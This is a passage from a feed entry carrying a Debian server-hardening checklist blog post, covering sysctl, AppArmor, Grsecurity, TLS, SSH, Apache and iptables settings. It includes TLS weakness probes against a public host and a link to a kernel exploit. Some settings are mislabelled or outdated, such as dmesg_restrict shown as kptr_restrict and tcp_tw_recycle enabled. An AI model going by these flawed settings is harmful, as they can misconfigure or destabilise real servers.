-&lt;h1 id=&quot;include-stdioh&quot;&gt;include &amp;lt;stdio.h&amp;gt;&lt;/h1&gt;
-&lt;p&gt;#include &amp;lt;sys/stat.h&amp;gt;
-#include &amp;lt;stdlib.h&amp;gt;&lt;/p&gt;
-
-&lt;p&gt;int main(int argc, char *argv[])
-{
-	struct stat sb;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;if( stat(argv[1], &amp;amp;sb) == -1){
-    perror(&quot;stat&quot;);
-	exit(EXIT_FAILURE);
-	}
-
-	if( chmod(argv[1], sb.st_mode) == -1)
-	{
-		perror(&quot;stat&quot;);
-			exit(EXIT_FAILURE);
-			}
-			return ; }
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;pre&gt;
-shawn@shawn-fortress ~ $ gcc change.c
-shawn@shawn-fortress ~ $ touch change-test
-shawn@shawn-fortress ~ $ ./a.out change-test
-&lt;/pre&gt;
-
-&lt;p&gt;The date of  “Modify” and “Change” should be different:
-shawn@shawn-fortress ~ $ stat change-test&lt;/p&gt;
-
-&lt;p&gt;Check *who* did it:&lt;/p&gt;
-
-&lt;p&gt;shawn@shawn-fortress ~ $ ausearch -i -k identify&lt;/p&gt;
-
-&lt;h3 id=&quot;t00ls&quot;&gt;—-[ 2.4 T00ls&lt;/h3&gt;
-
-&lt;p&gt;NMAP/OpenVAS/lynis/rkhunter/chkrootkit/metasploit/volatality/etc&lt;/p&gt;
-
-&lt;p&gt;–[ 3. Kernel security&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Anti-DoS related:&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;** SYN cookies is a syn flood attack protection, the default is enable( 1)：&lt;/p&gt;
-&lt;pre&gt;
-net.ipv4.tcp_syncookies = 1
-/proc/sys/net/ipv4/tcp_syncookies
-
-(optional)，if your kernel support SYNPROXY：
-iptables -t raw -A PREROUTING -i eth0 -p tcp --dport 80 --syn -j NOTRACK
-iptables -A INPUT -i eth0 -p tcp --dport 80 -m state UNTRACKED,INVALID \
-	 -j SYNPROXY --sack-perm --timestamp --mss 1480 --wscale 7 --ecn
-
-echo 0 &amp;gt; /proc/sys/net/netfilter/nf_conntrack_tcp_loose
-
-Note: SYNPROXY has been added into vanilla kernel in 3.13.
-&lt;/pre&gt;
-
-&lt;p&gt;** TCP FIN-WAIT-2 status lifetime, it’d be an DoS attack risk if
-the value is too big. It’d be cause remote machine doesn’t have enough
-time to close the connection if the value is too small. Default is 60(
-seconds). 15 is better, you think? &lt;a href=&quot;http://benohead.com/tcp-about-fin_wait_2-time_wait-and-close_wait/&quot;&gt;Further reading&lt;/a&gt;:&lt;/p&gt;
-
-&lt;pre&gt;
-net.ipv4.tcp_fin_timeout = 15
-/proc/sys/net/ipv4/tcp_fin_timeout
-&lt;/pre&gt;
-
-&lt;p&gt;** SYN queue length, the bigger value can handle more connections, the
-  default is 1024:&lt;/p&gt;
-
-&lt;pre&gt;
-net.ipv4.tcp_max_syn_backlog = 8192
-/proc/sys/net/ipv4/tcp_max_syn_backlog
-&lt;/pre&gt;
-
-&lt;p&gt;** Device queue length, this value should be bigger than syn queue?
-   The default is 1000&lt;/p&gt;
-
-&lt;pre&gt;
-net.core.netdev_max_backlog = 16384
-/proc/sys/net/core/netdev_max_backlog
-&lt;/pre&gt;
-
-&lt;p&gt;** listen()’s backlog, the default is 128:&lt;/p&gt;
-
-&lt;pre&gt;
-net.core.somaxconn = 4096
-/proc/sys/net/core/somaxconn
-&lt;/pre&gt;
-
-&lt;p&gt;** TIME_WAIT status TCP connections, the system will empty the
-   connection if the number is exceed the value,&lt;/p&gt;
-
-&lt;pre&gt;
-net.ipv4.tcp_max_tw_buckets = 65535
-/proc/sys/net/ipv4/tcp_max_tw_buckets
-&lt;/pre&gt;
-
-&lt;p&gt;** TIME-WAIT status can be reuse, the default is disable( 0):&lt;/p&gt;
-
-&lt;pre&gt;
-net.ipv4.tcp_tw_reuse = 1
-/proc/sys/net/ipv4/tcp_tw_reuse
-&lt;/pre&gt;
-
-&lt;p&gt;** fast recycle of TIME-WAIT status connection, the default is disable( 0):&lt;/p&gt;
-
-&lt;pre&gt;
-net.ipv4.tcp_tw_recycle = 1
-/proc/sys/net/ipv4/tcp_tw_recycle
-&lt;/pre&gt;
-
-&lt;p&gt;** TCP KEEPALIVE probe frequency,the default is 7,200 seconds:&lt;/p&gt;
-
-&lt;pre&gt;
-net.ipv4.tcp_keepalive_time = 300
-/proc/sys/net/ipv4/tcp_keepalive_time
-&lt;/pre&gt;
-
-&lt;p&gt;** TCP KEEPALIVE probe packets, the default is 9:&lt;/p&gt;
-
-&lt;pre&gt;
-net.ipv4.tcp_keepalive_probes = 3
-/proc/sys/net/ipv4/tcp_keepalive_probes
-&lt;/pre&gt;
-
-&lt;p&gt;** how many times of SYN and SYN+ACK can be re-transimit, the default is 5:&lt;/p&gt;
-
-&lt;pre&gt;
-net.ipv4.tcp_syn_retries = 3
-/proc/sys/net/ipv4/tcp_syn_retries
-
-net.ipv4.tcp_synack_retries = 3 
-/proc/sys/net/ipv4/tcp_synack_retries
-&lt;/pre&gt;
-
-&lt;p&gt;** the bigger value of TCP ORPHAN would prevent simple DoS attack,
-   each ORPHAN cost 64KB memory, so 65535 is about 4GB:&lt;/p&gt;
-
-&lt;pre&gt;
-net.ipv4.tcp_max_orphans = 65536
-/proc/sys/net/ipv4/tcp_max_orphans
-&lt;/pre&gt;
-
-&lt;p&gt;** How many pages( 4KB each page in x86) can be used in TCP connection:&lt;/p&gt;
-
-&lt;pre&gt;
-net.ipv4.tcp_mem = 131072 196608 262144
-/proc/sys/net/ipv4/tcp_mem
-&lt;/pre&gt;
-
-&lt;p&gt;Be careful about this one, it’d be triggered OOM if the TCP connection
-consume all pages.&lt;/p&gt;
-
-&lt;p&gt;** The maximum send and receive window, you can set 64MB for a 10G NIC:&lt;/p&gt;
-
-&lt;pre&gt;
-net.core.rmem_max = 67108864
-/proc/sys/net/core/rmem_max
-
-net.core.wmem_max = 67108864
-/proc/sys/net/core/wmem_max
-&lt;/pre&gt;
-
-&lt;p&gt;** Each TCP connection’s read buffer( X bytes):&lt;/p&gt;
-
-&lt;pre&gt;
-net.ipv4.tcp_rmem = 4096 8192 16777216( 4096 87380 33554432)
-/proc/sys/net/ipv4/tcp_rmem
-
-net.ipv4.tcp_wmem = 4096 8192 16777216( 4096 65536 33554432)
-/proc/sys/net/ipv4/tcp_wmem
-&lt;/pre&gt;
-
-&lt;p&gt;If default paging 8kb * 2 = 16kb/connection, 4GB memory can be used for:
-(4 * 1024 * 1024) / 16 = 262144&lt;/p&gt;
-
-&lt;p&gt;Oracle DB server’s &lt;a href=&quot;http://www.dba-oracle.com/t_linux_networking_kernel_parameters.htm&quot;&gt;best practice&lt;/a&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Networking&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Ref:
-https://www.suse.com/documentation/sles11/singlehtml/book_hardening/book_hardening.html&lt;/p&gt;
-
-&lt;p&gt;** Source Routing is used to specify a path or route through the
-network from source to destination. This feature can be used by
-network people for diagnosing problems. However, if an intruder was
-able to send a source routed packet into the network, then he could
-intercept the replies and your server might not know that it’s not
-communicating with a trusted server.&lt;/p&gt;
-
-&lt;pre&gt;
-net.ipv4.conf.all.accept_source_route = 0
-/proc/sys/net/ipv4/conf/all/accept_source_route
-&lt;/pre&gt;
-
-&lt;p&gt;** ICMP redirects are used by routers to tell the server that there is
-   a better path to other networks than the one chosen by the
-   server. However, an intruder could potentially use ICMP redirect
-   packets to alter the hosts’s routing table by causing traffic to
-   use a path you didn’t intend.&lt;/p&gt;
-
-&lt;pre&gt;
-net.ipv4.conf.all.accept_redirects = 0
-/proc/sys/net/ipv4/conf/all/accept_redirects
-&lt;/pre&gt;
-
-&lt;p&gt;** Turn it off if this is not a router：&lt;/p&gt;
-
-&lt;pre&gt;
-net.ipv4.conf.all.send_redirects = 0
-net.ipv4.conf.default.send_redirects = 0
-
-/proc/sys/net/ipv4/conf/all/send_redirects
-/proc/sys/net/ipv4/conf/default/send_redirects
-&lt;/pre&gt;
-
-&lt;p&gt;** IP spoofing protection, the default is disabled( 0)：&lt;/p&gt;
-&lt;pre&gt;
-net.ipv4.conf.all.rp_filter = 1
-/proc/sys/net/ipv4/conf/all/rp_filter
-&lt;/pre&gt;
-
-&lt;p&gt;** If you want to ignore all ICMP package, you can enable it. The
-   default is disabled( 0):&lt;/p&gt;
-
-&lt;pre&gt;
-net.ipv4.icmp_echo_ignore_all = 1
-/proc/sys/net/ipv4/icmp_echo_ignore_all
-&lt;/pre&gt;
-
-&lt;p&gt;** Ignore ICMP broadcast, the default is enabled( 1):&lt;/p&gt;
-
-&lt;pre&gt;
-net.ipv4.icmp_echo_ignore_broadcasts = 1
-/proc/sys/net/ipv4/icmp_echo_ignore_broadcasts
-&lt;/pre&gt;
-
-&lt;p&gt;** To alert you about bad message, the default is disabled( 1):&lt;/p&gt;
-
-&lt;pre&gt;
-net.ipv4.icmp_ignore_bogus_error_responses = 1
-/proc/sys/net/ipv4/icmp_ignore_bogus_error_responses
-&lt;/pre&gt;
-
-&lt;p&gt;** To turn on logging for Spoofed Packets, Source Routed Packets, and
-   Redirect Packets, the default is disabled( 0):&lt;/p&gt;
-
-&lt;pre&gt;
-/proc/sys/net/ipv4/conf/all/log_martians
-net.ipv4.conf.all.log_martians = 1
-&lt;/pre&gt;
-
-&lt;h2 id=&quot;exploit-mitigation&quot;&gt;Exploit mitigation&lt;/h2&gt;
-&lt;p&gt;** Randomize the memory area. 0: disable ASLR. 1: Randomize the stack,
-   VDSO page, shared memory regions. 2: (1) + also randomize the data
-   segment.&lt;/p&gt;
-
-&lt;pre&gt;
-kernel.randomize_va_space=2
-/proc/sys/kernel/randomize_va_space
-&lt;/pre&gt;
-
-&lt;p&gt;** Not allow the user to read kernel address symbol tables:&lt;/p&gt;
-&lt;pre&gt;
-kernel.kptr_restrict=1
-/proc/sys/kernel/kptr_restrict
-&lt;/pre&gt;
-
-&lt;p&gt;** dmesg info can be read by root-only:&lt;/p&gt;
-&lt;pre&gt;
-kernel.kptr_restrict=1
-/proc/sys/kernel/dmesg_restrict
-&lt;/pre&gt;
-
-&lt;p&gt;** the minimal memory map address, 65536 is good at least:&lt;/p&gt;
-&lt;pre&gt;
-vm.mmap_min_addr=65536
-/proc/sys/vm/mmap_min_addr
-&lt;/pre&gt;
-
-&lt;p&gt;** Now allow the debugger trace the process by ptrace. The current
-   Debian stable kernel doesn’t have this feature. 0: All process can
-   be debugged. 1: Only one father process can be debugged. 2: Only
-   &lt;em&gt;root&lt;/em&gt; can do debug( with CAP_SYS_PTRACE) 3: no process can be
-   debugged&lt;/p&gt;
-&lt;pre&gt;
-kernel.yama.ptrace_scope = 2
-/proc/sys/kernel/yama/ptrace_scope
-&lt;/pre&gt;
-
-&lt;h3 id=&quot;apparmor&quot;&gt;—-[ 3.1 Apparmor&lt;/h3&gt;
-
-&lt;p&gt;Why Apparmor? It’s easy to deploy. More importantly, it’s easy to
-audit the polices. Everyone can write your own MAC/RBAC
-policy. Debian/OpenSuSE shipped with Apparmor by default.&lt;/p&gt;
-
-&lt;p&gt;Install Apparmor and MAC polices from community:
-#apt-get install -y apparmor-profiles apparmor&lt;/p&gt;
-
-&lt;p&gt;Check the status:
-#aa-status&lt;/p&gt;
-
-&lt;h3 id=&quot;selinux&quot;&gt;—-[ 3.2 SELinux&lt;/h3&gt;
-
-&lt;p&gt;S0rry. I barely use SELinux for reasons. The 1st one is I don’t trust
-NSA, even the source code is GPL’ed. NSA is professional about
-&lt;em&gt;implant&lt;/em&gt; backdoors, which would be very hard to audit. People has
-been discussing it for years:&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://www.schneier.com/blog/archives/2008/04/nsas_linux.html&quot;&gt;NSA SELinux&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;http://www.zerohedge.com/news/2013-07-09/nsa-has-inserted-its-code-android-os-bugging-three-quarters-all-smartphones&quot;&gt;NSA has inserted its code into Android&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;http://www.eteknix.com/nsa-has-code-running-in-the-linux-kernel-and-android/&quot;&gt;NSA linux/android kernel&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Sebastian Krahmer found a &lt;a href=&quot;https://github.com/stealth/troubleshooter&quot;&gt;exploitable bug&lt;/a&gt; from SELinux recently. It looks like a backdoor more than a “vulnerablity”, isn’t it?;-)
-Another important reason people don’t like SELinux because it’s hard
-to use and cause other application troubles from time to time. &lt;a href=&quot;http://stopdisablingselinux.com/&quot;&gt;Stop
-disabling SELinux&lt;/a&gt; movement won’t work in the near future:&lt;/p&gt;
-
-&lt;p&gt;S0rry, Mr.Walsh. It’s nothing personal:-)&lt;/p&gt;
-
-&lt;h3 id=&quot;mempo-kernel&quot;&gt;—-[ 3.3 Mempo kernel&lt;/h3&gt;
-
-&lt;p&gt;”“⌘ Mempo project aims to provide most secure and yet comfortable
-out-of-the-box Desktop and Server computer, for professionals,
-business, journalists, and every-day users avoiding PRISM-like
-spying. ⌘”&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://wiki.debian.org/Mempo&quot;&gt;Mempo&lt;/a&gt; is a FLOSS project for protect user’s digital freedom. Let the
-massive surveillance cry;-)&lt;/p&gt;
-
-&lt;p&gt;The Debian Mempo repo is not working for the internet user now and
-it’ll be back soon. So I’ll write how to use PaX/Grsecurity from
-offical Mempo repository on Debian.&lt;/p&gt;
-
-&lt;h3 id=&quot;paxgrsecurity&quot;&gt;—-[ 3.3.1 PaX/Grsecurity&lt;/h3&gt;
-
-&lt;p&gt;PaX/Grsecurity is the cutting-edge kernel protection in past 14
-years. But they don’t have the credit what they supposed to
-have. Almost every main stream OS kernel security mechanism has
-influenced by PaX/Grsecurity in past decade. Lionel tells a &lt;a href=&quot;http://www.openwall.com/lists/oss-security/2014/12/06/14&quot;&gt;little story&lt;/a&gt; about PaX/Grsecurity better than myself:&lt;/p&gt;
-
-&lt;p&gt;PaX/Grsecurity treat the kernel security as a whole. They’ve been
-inventing many innovations( SEGMEXEC, PAGEEXEC, MPROTECT, UDEREF,
-RANDSTRUCT&lt;em&gt;, etc), while hardening the kernel in source code level(
-make important *struct&lt;/em&gt; read-only, etc). PaX/Grsecurity is one of most
-respected 0ld sch00l hacker community. The main contributor( Spender)
-was even been through a &lt;a href=&quot;http://developers.slashdot.org/story/04/05/31/1949241/end-of-development-for-grsecurity-announced&quot;&gt;very badly economic situation&lt;/a&gt; back in 2004&lt;/p&gt;
-
-&lt;p&gt;Thanks to the G0d of techn0logy, PaX/Grsecurity is still alive…. I
-personally agree with some ideas:&lt;/p&gt;
-
-&lt;hr /&gt;
-&lt;p&gt;“The “better than none” point of view is actually a nice way to false
-sense of security for those who don’t know better. We got
-better-than-none apparmor, selinux, tomoyo, some poorly maintained and
-crippled ports of grsec features or alikes, namespaces and containers,
-rootkit-friendly LSM, the dumb and useless kernel version of SSP,
-etc. What’s the sum of all this shit for end users? False sense of
-security…”&lt;/p&gt;
-
-&lt;p&gt;“without Grsecurity/PaX, linux security is like monkey can never
-perform a regular masturbation cu’z lacking of giant pennis;-)”
-———————————————————————–&lt;/p&gt;
-
-&lt;p&gt;Too many better-than-none product or solutions, which only makes you
-feel safe, maybe for a while. Feel safe is not equal to
-secure. Fuc*ing cargo cult shitty security only makes things worse.&lt;/p&gt;
-
-&lt;p&gt;I’ll show you how to install PaX/Grsecurity manually( still waiting
-Mempo back online):&lt;/p&gt;
-
-&lt;p&gt;** &lt;a href=&quot;https://www.kernel.org/pub/linux/kernel/v3.x/&quot;&gt;Download kernel&lt;/a&gt; ( Pick one)：
-https://www.kernel.org/pub/linux/kernel/v3.x/&lt;/p&gt;
-
-&lt;p&gt;** Download &lt;a href=&quot;https://grsecurity.net/download.php&quot;&gt;PaX/Grsecurity patch&lt;/a&gt; ( you can download the latest version
-   from )：&lt;/p&gt;
-
-&lt;p&gt;** Decompress the kernel and patch the kernel with grsecurity:&lt;/p&gt;
-&lt;pre&gt;
-xz -d linux-*.tar.xz
-tar xvf linux-*.tar
-cd linux-*/
-patch -p1 &amp;lt; ../grsecurity-*.patch
-&lt;/pre&gt;
-
-&lt;p&gt;** Do “make menuconfig” to customize your kernel, or you can use &lt;a href=&quot;https://raw.githubusercontent.com/citypw/citypw-SCFE/master/security/apparmor_test/debian-7.4-linux-3.14.1-grsec.config&quot;&gt;my test config&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;** Compile&lt;/p&gt;
-&lt;pre&gt;
-make -j7 deb-pkg
-&lt;/pre&gt;
-
-&lt;p&gt;** Install the new kernel&lt;/p&gt;
-&lt;pre&gt;
-dpkg -i ../*.deb
-&lt;/pre&gt;
-
-&lt;h2 id=&quot;crypto&quot;&gt;–[ 4. Crypto&lt;/h2&gt;
-
-&lt;p&gt;“Encryption works. Properly implemented strong crypto systems are one
-of the few things that you can rely on. Unfortunately, endpoint
-security is so terrifically weak that NSA can frequently find ways
-around it.”   — Edward Snowden&lt;/p&gt;
-
-&lt;p&gt;Damn, we should treat the crypto engineering very carefully. Because
-it may be the last outter-heaven we have;-)&lt;/p&gt;
-
-&lt;p&gt;—-[ 4.1 SSL/TLS Checklist&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;http://www.exploresecurity.com/wp-content/uploads/custom/SSL_manual_cheatsheet.html&quot;&gt;Very good writing&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;SSL/TLS has been through BEAST/CRIME/LUCKY-13/HEARTBLEED/POODLE in
-past few years. and it’s already become one of hottest topic in cyber
-security. There are a set of vulnerable protocols and ciphersuites are
-worth to do audit. There are a few open source tools would make your
-audit work easier. Try this one:&lt;/p&gt;
-
-&lt;pre&gt;
-#apt-get install sslscan
-
-
-SSLv2 should be disabled:
-openssl s_client -ssl2 -connect www.google.com:443
-
-OpenSSL 1.0 no longer support SSLv2. So you can use GnuTLS do the
-check:
-
-gnutls-cli -d 5 -p 443 --priority &quot;NORMAL:-VERS-TLS1.2:-VERS-TLS1.1:-VERS-TLS1.0:-VERS-SSL3.0&quot; www.google.com
-&lt;/pre&gt;
-
-&lt;p&gt;FREAK:&lt;/p&gt;
-&lt;pre&gt;
-openssl s_client -cipher EXPORT -connect www.google.com:443
-&lt;/pre&gt;
-
-&lt;p&gt;If succeed, it’s risk to FREAK.&lt;/p&gt;
-
-&lt;p&gt;—-[ 4.2 OpenSSH&lt;/p&gt;
-
-&lt;p&gt;Config file：/etc/ssh/ssh_config&lt;/p&gt;
-
-&lt;pre&gt;
-1, known_hosts stores server's signature, so hash the host name:
-
-HashKnownHosts yes
-
-2, SSH protocl version 1 is not secure:
-
-Protocol 2
-
-3, If you don't use X11 forwarding, plz disable it&quot;
-
-X11Forwarding no
-
-4, Disable rhosts:
-
-IgnoreRhosts yes
-
-5, Not allow empty password:
-
-PermitEmptyPasswords no
-
-6, Maxisum tries:
-
-MaxAuthTries 5
-
-7, Now allow root login:
-
-PermitRootLogin no
-
-
-(Optional)
-1, disable password auth, enable pubkey auth:
-
-PubkeyAuthentication yes
-
-PasswordAuthentication no
-
-
-2，Allow or deny users/groups
-
-AllowGroups, AllowUsers, DenyUsers, DenyGroups
-&lt;/pre&gt;
-
-&lt;h3 id=&quot;openssh-in-post-prism-era&quot;&gt;——[ 4.2.1 OpenSSH in post-prism era&lt;/h3&gt;
-
-&lt;p&gt;Well, plz &lt;a href=&quot;https://stribika.github.io/2015/01/04/secure-secure-shell.html&quot;&gt;read this&lt;/a&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;ciphersuites-in-apache2nginx&quot;&gt;—-[ 4.2 Ciphersuites in Apache2/Nginx&lt;/h3&gt;
-
-&lt;p&gt;The explanation is &lt;a href=&quot;https://hynek.me/articles/hardening-your-web-servers-ssl-ciphers/&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Apache:
-SSLProtocol ALL -SSLv2 -SSLv3
-SSLHonorCipherOrder On
-SSLCipherSuite ECDH+AESGCM:DH+AESGCM:ECDH+AES256:DH+AES256:ECDH+AES128:DH+AES:ECDH+3DES:DH+3DES:RSA+AESGCM:RSA+AES:RSA+3DES:!aNULL:!MD5:!DSS&lt;/p&gt;
-
-&lt;p&gt;Nginx:
-ssl_prefer_server_ciphers On;
-ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
-ssl_ciphers ECDH+AESGCM:DH+AESGCM:ECDH+AES256:DH+AES256:ECDH+AES128:DH+AES:ECDH+3DES:DH+3DES:RSA+AESGCM:RSA+AES:RSA+3DES:!aNULL:!MD5:!DSS&lt;/p&gt;
-
-&lt;p&gt;–[ 5. Web security&lt;/p&gt;
-
-&lt;p&gt;You’re not reading this article for learning pentest, are you? Let’s
-just consider the fence of defender’s;-)&lt;/p&gt;
-
-&lt;p&gt;OWASP code review:
-https://www.owasp.org/images/2/2e/OWASP_Code_Review_Guide-V1_1.pdf
-https://www.owasp.org/index.php/OWASP_Code_review_V2_Project&lt;/p&gt;
-
-&lt;p&gt;OWASP testing guide:
-https://www.owasp.org/images/5/52/OWASP_Testing_Guide_v4.pdf
-https://www.owasp.org/index.php/OWASP_Guide_Project&lt;/p&gt;
-
-&lt;p&gt;—-[ 5.1 Web server( Apache/Nginx ?)&lt;/p&gt;
-
-&lt;p&gt;ServerRoot&lt;/p&gt;
-&lt;pre&gt;
-Web server's root path. Default is &quot;/etc/httpd&quot;. It's import to keep
-track of its permission. Recommend: Do not allow none-root user has
-the permission to modify it.
-
-chown root:root /etc/httpd
-chmod 754 /etc/httpd
-&lt;/pre&gt;
-
-&lt;p&gt;Timeout&lt;/p&gt;
-&lt;pre&gt;
-Lifetime per session. Default is 60 seconds. Set the lower value for
-mitigating DoS attack. Recommend: 15 &amp;lt;= X &amp;lt;= 30
-&lt;/pre&gt;
-
-&lt;p&gt;KeepAlive&lt;/p&gt;
-&lt;pre&gt;
-Persistent session. Default is “Off”. Recommend: On
-&lt;/pre&gt;
-
-&lt;p&gt;User&lt;/p&gt;
-&lt;pre&gt;
-Decide which user Apache work process running as. Recommend: nobody
-&lt;/pre&gt;
-
-&lt;p&gt;Group&lt;/p&gt;
-&lt;pre&gt;
-Decide which group Apache work process running as. Recommend: nobody
-&lt;/pre&gt;
-
-&lt;p&gt;Blacklist/whitelist IP/networks&lt;/p&gt;
-&lt;pre&gt;
-Order Deny,Allow
-Deny from all
-Allow from 176.16.0.0/16
-
-Or by IP:
-
-Order Deny,Allow
-Deny from all
-Allow from 127.0.0.1
-&lt;/pre&gt;
-
-&lt;p&gt;Blacklist/whitelist web contents&lt;/p&gt;
-&lt;pre&gt;
-It can prevent malicious attack via web content.
-
-&amp;lt; Directory /&amp;gt;
-Order Deny,Allow # Default is Allow
-Deny from all  # Deny all contents
-&amp;lt; /Directory&amp;gt;
-&lt;/pre&gt;
-
-&lt;p&gt;Options FollowSymLinks&lt;/p&gt;
-&lt;pre&gt;
-Do not list any other files if the visited file don't exit.
-&lt;/pre&gt;
-
-&lt;p&gt;Hide info&lt;/p&gt;
-&lt;pre&gt;
-ServerSignature:
-* Off, do not provide any information
-* On, provide Apache infomation
-
-ServerTokens:
-* Full, exposure all information
-* Prod, only provide server name
-&lt;/pre&gt;
-
-&lt;p&gt;Limit risky HTTP methods&lt;/p&gt;
-&lt;pre&gt;
-&amp;lt; Directory /&amp;gt;
-&amp;lt; LimitExcept GET POST&amp;gt;
-Deny from all
-&amp;lt; /LimitExcept&amp;gt;
-&amp;lt; /Directory&amp;gt;
-
-PUT/DELETE/etc methods won't be available.
-&lt;/pre&gt;
-
-&lt;p&gt;MinSpareServers&lt;/p&gt;
-&lt;pre&gt;
-Minimal spare processes. Default is 5. Recommend: 32.
-&lt;/pre&gt;
-
-&lt;p&gt;MaxSpareServers&lt;/p&gt;
-&lt;pre&gt;
-Maximum spare processes. Default is 20. Recommend: 64.
-&lt;/pre&gt;
-
-&lt;p&gt;ServerLimit&lt;/p&gt;
-&lt;pre&gt;
-The number that MaxClients can't not exceed.
-&lt;/pre&gt;
-
-&lt;p&gt;MaxClients&lt;/p&gt;
-&lt;pre&gt;
-The maximum number of working processes. Default is 256. Recommend:
-8192.
-
-MaxClients = (RAM available to Apache) / (RAM per Apache process)
-
-RAM per Apache process:
-#ps -ylC httpd --sort:rss
-
-Example:
-64GB physical memory * 0.8 = RAM available to Apache
-HTML &amp;lt;= 5MB per process, PHP &amp;lt;= 15MB per processe
-php: MaxClients = 65536MB / 15MB =4369
-&lt;/pre&gt;
-
-&lt;p&gt;MaxRequestsPerChild&lt;/p&gt;
-&lt;pre&gt;
-Limit on the number of requests that an individual child server will
-handle during its life. Default is 4000. Recommend: 1500.
-&lt;/pre&gt;
-
-&lt;p&gt;—-[ 5.2 WAF&lt;/p&gt;
-
-&lt;p&gt;ModSecurity is an open source, cross-platform web application firewall
-(WAF) module. Known as the “Swiss Army Knife” of WAFs, it enables web
-application defenders to gain visibility into HTTP(S) traffic and
-provides a power rules language and API to implement advanced
-protections. The web malicious signatures( including OWASP Top 10) are
-maintained by ModSecurity community. You can &lt;a href=&quot;https://www.digitalocean.com/community/tutorials/how-to-set-up-mod_security-with-apache-on-debian-ubuntu&quot;&gt;deploy it on Debian&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;Anti-DoS: &lt;a href=&quot;https://www.linode.com/docs/websites/apache-tips-and-tricks/modevasive-on-apache&quot;&gt;mod_evasive&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;About anti DoS solution, I personally don’t get used to
-mod_evasive. Iptables would be much easier to maintain, eg:&lt;/p&gt;
-&lt;pre&gt;
-iptables -I INPUT -p tcp -m multiport --dports 80,443 -i eth0 -m state --state NEW -m recent --set
-iptables -I INPUT -p tcp -m multiport --dports 80,443 -i eth0 -m state --state NEW -m recent --update --seconds 30 --hitcount 5 -j DROP
-&lt;/pre&gt;
-
-&lt;p&gt;–[ 6. Security standard&lt;/p&gt;
-
-&lt;p&gt;Well, there are a bunch of crazy security standards in the
-planet. Some are compliance in some contries. FIPS-140-2/3, CC( EAL 7?
-damn, it’d be an incarnation of the organge book;-)), PCI-DSS are very
-popular terms you might hear from your security consultant. But… due
-to lack of engineering implementation, these crazy( &amp;amp; creepy?)
-security standards are not our concerns here.&lt;/p&gt;
-
-&lt;p&gt;—-[ 6.1 STIGs for Debian&lt;/p&gt;
-
-&lt;p&gt;Once there’s history, there’s story about offense &amp;amp; defense. Once
-we’ve heard fascinating stories from Mr.Sn0wden about how NSA fuck the
-world, there should be some open information about how BIG-BROTHER do
-the defense. &lt;a href=&quot;http://iase.disa.mil/stigs/Pages/index.aspx&quot;&gt;STIGs&lt;/a&gt; is one of them.&lt;/p&gt;
-
-&lt;p&gt;I think I’m not the right person to write this section…..plz &lt;a href=&quot;http://hardenedlinux.org/jekyll/update/2015/06/19/STIG-4-Debian.html&quot;&gt;check this out&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;–[ 7. Reference&lt;/p&gt;
-
-&lt;p&gt;[1] Back To The Future: Unix Wildcards Gone Wild
-    http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt&lt;/p&gt;
-
-&lt;p&gt;[2] SYNPROXY
-    http://lwn.net/Articles/563151/&lt;/p&gt;
-
-&lt;p&gt;[3] DDoS protection Using Netfilter/iptables
-    http://people.netfilter.org/hawk/presentations/devconf2014/iptables-ddos-mitigation_JesperBrouer.pdf&lt;/p&gt;
-
-&lt;p&gt;[4] INTERNET PROTOCOL
-    http://tools.ietf.org/html/rfc791&lt;/p&gt;
-
-&lt;p&gt;[5] A simple TCP spoofing attack
-    http://www.citi.umich.edu/u/provos/papers/secnet-spoof.txt&lt;/p&gt;
-
-&lt;p&gt;[6] ICMP Attacks Illustrated
-    http://www.sans.org/reading-room/whitepapers/threats/icmp-attacks-illustrated-477&lt;/p&gt;
-
-&lt;p&gt;[7] SUSE Linux Enterprise Server 11 SP3 - Security and Hardening
-    https://www.suse.com/documentation/sles11/singlehtml/book_hardening/book_hardening.html&lt;/p&gt;
-
-&lt;p&gt;[8] Securing Debian Manual 
-    https://www.debian.org/doc/manuals/securing-debian-howto/&lt;/p&gt;
-
-&lt;p&gt;[9] A Brief Introduction to auditd
-    http://security.blogoverflow.com/2013/01/a-brief-introduction-to-auditd/&lt;/p&gt;
-
-&lt;p&gt;[10] Apparmor RBAC
-     http://wiki.apparmor.net/index.php/Pam_apparmor_example&lt;/p&gt;
-
-&lt;p&gt;[11] Hardening PHP from php.ini
-     http://www.madirish.net/199&lt;/p&gt;
-
-&lt;p&gt;[12] CVE-2014-0196 exploit
-http://bugfuzz.com/stuff/cve-2014-0196-md.c&lt;/p&gt;
-
-&lt;p&gt;[13] Secure Secure Shell
-https://stribika.github.io/2015/01/04/secure-secure-shell.html&lt;/p&gt;
-
-&lt;p&gt;[14] STIGs
-     http://iase.disa.mil/stigs/Pages/index.aspx
-     http://iase.disa.mil/stigs/os/unix-linux/Pages/index.aspx&lt;/p&gt;
-</description>
-        <pubDate>Wed, 10 Jun 2015 06:48:45 +0800</pubDate>
-        <link>http://www.hardenedlinux.org/system-security/2015/06/10/debian-security-chklist.html</link>
-        <guid isPermaLink="true">http://www.hardenedlinux.org/system-security/2015/06/10/debian-security-chklist.html</guid>
         
         
         <category>system-security</category>
